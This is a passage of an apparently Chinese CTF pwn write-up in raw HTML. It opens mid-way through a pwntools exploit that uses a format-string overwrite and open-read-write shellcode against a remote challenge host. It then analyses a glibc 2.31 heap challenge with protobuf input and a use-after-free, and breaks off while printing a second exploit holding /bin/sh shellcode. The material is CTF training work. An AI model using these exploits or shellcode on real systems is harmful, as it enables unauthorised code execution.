punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------------------------------</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearchercontext<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">)</span><span class="token comment">#context.terminal=["tmux","splitw","-h"]</span>binary<span class="token operator">=</span><span class="token string">"./pwn"</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token comment">#------------------------------------------------------------------</span>choose<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">if</span> choose<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token comment">#ENV=&#123;"LD_PRELOAD":"/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"&#125;</span><span class="token comment">#io=process(["/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so",name],env=ENV)</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"123.56.237.147"</span><span class="token punctuation">,</span><span class="token number">45570</span><span class="token punctuation">)</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>start<span class="token operator">=</span><span class="token number">0x0000000000401150</span>bss<span class="token operator">=</span><span class="token number">0x0000000000404060</span>orwchain<span class="token operator">=</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>orwchain<span class="token operator">+=</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'rsp'</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>orwchain<span class="token operator">+=</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'rsp'</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">712</span><span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%34$hn'</span> <span class="token comment">#34</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>asm<span class="token punctuation">(</span>orwchain<span class="token punctuation">)</span><span class="token comment">#dbg('b *0x000000000040146C\nc\n')</span>sa<span class="token punctuation">(</span><span class="token string">'start!'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/d5979ae7620a1e44c7a96ef663584525_MD5.jpeg"></p><h1 id="chat"><a href="#chat" class="headerlink" title="chat"></a>chat</h1><blockquote><p>一道4解题，在赛后解出来了😠</p></blockquote><p>【2.31-0ubuntu9.12】堆风水，protobuf序列化，2.31堆沙盒<br>保护全开，还是沙盒<br><img src="/EXP_FILE/05e598de0cef3e5612840f8346e8972a_MD5.jpeg"></p><h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p>有增删查改四个功能，不过在开始的choose上就难住了我们</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">  <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">// choose</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">>=</span> <span class="token number">0x11</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Read Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token function">sub_1C15</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token function">edit</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">></span> <span class="token number">4</span> <span class="token punctuation">)</span>  <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">case</span> <span class="token number">3u</span><span class="token operator">:</span>    <span class="token function">show</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token keyword">case</span> <span class="token number">1u</span><span class="token operator">:</span>    <span class="token function">add</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token keyword">case</span> <span class="token number">2u</span><span class="token operator">:</span>    <span class="token function">delete</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token keyword">default</span><span class="token operator">:</span>    <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>依据v3来进行选择，而v3&#x3D;*(v5+32)；而v5由<code>v5 = sub_1C15(0LL, v4, buf);</code>得到，其中v4是我们输入的长度，buf是输入的内容。这个函数如下：<br><img src="/EXP_FILE/cfeb9470b6c5445a203d0a8bd3a33a57_MD5.jpeg"><br>这貌似是一个解包函数，对我们的输入内容进行解包。经过浏览器搜索可知是protobuf序列化，我们需要传入一个结构体并进行protobuf打包，网上教程很多，在此不再赘述</p><blockquote><p>Protobuf (Protocol Buffers) 是谷歌开发的一款无关平台，无关语言，可扩展，轻量级高效的序列化结构的数据格式，用于将自定义数据结构序列化成字节流，和将字节流反序列化为数据结构。所以很适合做数据存储和为不同语言，不同应用之间互相通信的数据交换格式，只要实现相同的协议格式，即后缀为proto文件被编译成不同的语言版本，加入各自的项目中，这样不同的语言可以解析其它语言通过Protobuf序列化的数据。目前官方提供c++，java，go等语言支持。</p></blockquote><p>如何确定结构体成员，在.data.rel.ro段看出了端倪<br><img src="/EXP_FILE/2b362bd22552955f8a8ff30bba5dff1d_MD5.jpeg"><br>再经过对各功能函数偏移的分析，可知结构体如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">msg</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> flag <span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">int</span> choice<span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">int</span> idx<span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><ul><li><p>add</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">add</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-Ch]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"ADD"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// flag:0x18</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Wrong flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">// idx:0x28</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Wrong idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">=</span> v2<span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4064 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// size:0x30</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4064 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x80u</span> <span class="token punctuation">)</span><span class="token comment">// 只能在0x80以内</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Wrong size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4064 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v3 <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Malloc failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  heaparray<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> v2<span class="token punctuation">]</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please input the content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>heaparray<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> v2<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4064 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Read Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Add success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>delete</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">sub_179D</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"DELETE"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Wrong flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4064 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Wrong idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>heaparray<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// uaf</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有一个uaf</p></li><li><p>show</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">sub_1916</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"SHOW"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Wrong flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4064 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Wrong idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>heaparray<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> v2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>edit</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> __fastcall <span class="token function">sub_183C</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">ssize_t</span> result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"EDIT"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Wrong flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4064 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Wrong idx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Please input the content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>heaparray<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> v2<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4064 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> result <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>    <span class="token function">my_error</span><span class="token punctuation">(</span><span class="token string">"Read Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><p>输入的size只能在0x80以内，我们只能得到tcachebin chunk和fastbin chunk，对于利用我们有以下几个难题：</p><ol><li><p>泄露libc：没有unsortedbin chunk，想过利用malloc_consolidate得到unsortedbin chunk，但是申请chunk时会出现0x40和0x20的chunk与其它chunk分隔开，无法触发malloc_consolidate来合并fastbin<br><img src="/EXP_FILE/bb03948443ab05b5e93b62ace2b52815_MD5.jpeg"><br>对策：我们能得到堆地址，利用tcache posioning篡改其它tcache chunk-&gt;size，得到unsortedbin chunk</p></li><li><p>要打2.31的orw，0x80的chunk大小无法容纳srop_frame</p></li></ol><p>有这样一个gadget，可以通过rdi控制rdx：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">pwndbg<span class="token operator">></span> pdisass getkeyserv_handle<span class="token operator">+</span><span class="token number">576</span> ► <span class="token number">0x7f0d55f0f930</span> <span class="token operator">&lt;</span>getkeyserv_handle<span class="token operator">+</span><span class="token number">576</span><span class="token operator">></span>    mov    rdx<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rdi <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span>   <span class="token number">0x7f0d55f0f934</span> <span class="token operator">&lt;</span>getkeyserv_handle<span class="token operator">+</span><span class="token number">580</span><span class="token operator">></span>    mov    qword ptr <span class="token punctuation">[</span>rsp<span class="token punctuation">]</span><span class="token punctuation">,</span> rax   <span class="token number">0x7f0d55f0f938</span> <span class="token operator">&lt;</span>getkeyserv_handle<span class="token operator">+</span><span class="token number">584</span><span class="token operator">></span>    call   qword ptr <span class="token punctuation">[</span>rdx <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们不需要控制全部的frame，只需要frame的rsp和rip位，偏移为0xa8：<br><img src="/EXP_FILE/5fe5d0ad0378ccfb9017c1b96c86bc75_MD5.jpeg"></p><p>我们可以利用堆风水技巧，这样进行堆的排布：<br><img src="/EXP_FILE/71e0ae5f8f3ea8db7539e6b75eca7e52_MD5.jpeg"></p><ol start="3"><li>chunk无法容纳：要打2.31的orw，0x80的chunk大小无法容纳0xa8的orwchain<br>对策：既然我们能控制执行流了，直接调用read进行堆上写并调用，然后我们手动发送orw即可<br><img src="/EXP_FILE/b560713c1f4f0f1fa9088f95f44bada5_MD5.jpeg"><br>EXP：<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span>she_i386_20<span class="token operator">=</span><span class="token string">b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span>she_amd64_30<span class="token operator">=</span><span class="token string">b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num   <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token 